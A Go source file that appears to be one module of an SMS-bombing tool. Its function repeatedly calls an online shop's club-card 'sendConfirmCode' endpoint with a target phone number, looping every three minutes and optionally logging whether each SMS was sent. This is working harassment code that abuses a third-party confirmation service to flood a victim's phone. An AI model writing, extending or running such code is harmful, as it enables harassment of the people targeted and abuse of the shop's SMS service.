package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func funday() {
	req := newreq()
	req.SetRequestURI("https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber=+" + num[0:1] + "%20(" + num[1:4] + ")" + num[4:7] + "-" + num[7:9] + "-" + num[9:])

	timeout := time.Minute*3 + time.Second*2
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `result":"sendConfirmCode`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
